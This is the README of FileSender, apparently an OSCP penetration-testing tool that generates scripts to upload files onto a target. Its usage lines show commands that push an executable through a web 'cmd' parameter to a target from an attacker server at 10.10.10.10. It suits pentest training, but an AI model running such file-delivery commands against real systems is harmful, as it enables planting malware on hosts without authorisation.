[![PyPi](https://img.shields.io/pypi/v/filesender.svg)](https://pypi.org/pypi/filesender/)
![License](https://img.shields.io/github/license/EmilienPer/FileSender.svg?style=flat)
[![Donate](https://img.shields.io/badge/donate-paypal-orange.svg)](https://www.paypal.me/EmilienPer)
[![Beerpay](https://beerpay.io/EmilienPer/HackRecon/badge.svg?style=flat)](https://beerpay.io/EmilienPer/HackRecon)
## Table of Contents
   * [FileSender](#filesender)
   * [Requirement](#requirement)
   * [Installation](#installation)
   * [Options](#options)
   * [Usage](#usage)
   * [Example](#example)
   * [Issues management](#issues-management)
  
## FileSender
Project URL : https://github.com/EmilienPer/FileSender

FileSender was created to be used for OSCP certification.
It's aims to generate a script to upload a file to a target in different languages. 
The base mechanism is the following : 

- Copy the file in a tempory directory 
- Start a server (if required) 
- Create the script to download the file from the server or to build the file
- Send the script to the target


## Requirement
FileSender run on Python 2.7 can't work correctly without the following tools

The following tools are required: 
- upx (/usr/bin/upx)
- exe2bat.exe
- wine  

## Installation
`sudo pip install filesender`

## Options
| Option | Shortcut | Description |
| ------ | -------- | ----------- |
| file || The path to file to send | 
| method | | the language of the script (powershell,hex,ftp,wget,vbscript,exe2bat)|
| type | | the type of output/sending method (print / get / post) |
| dest | |  the destination directory on the target |
| --server-ip | | The local ip address | 
| --server-port | | The local port | 
|--url|-u| The Target URL|
|--params|-p|A json  {key:value}  where value=<SCRIPT> when should be replace by the script|
|--cookies| -c | The cookies json|
|--timeout| | The timeout for server| 


## Usage
* `filesender /path/to/my/file.exe wget get /path/on/the/target --server-ip 10.10.10.10 --server-port 80 -u http://target.com -p {\"cmd\":\"<SCRIPT>\"} -c {} --timeout 10`
* `filesender /path/to/my/file.exe ftp print /path/on/the/target`
* ` filesender /path/to/my/file.exe wget get /path/on/the/target --server-ip 10.10.10.10 --server-port 80 -u http://target.com -p {\"cmd\":\"<SCRIPT>\"}`

## Issues management 
For contributions or suggestions, please [open an Issue](https://github.com/EmilienPer/GetAShell/issues/new) and clearly explain, using an example or a use case if appropriate. 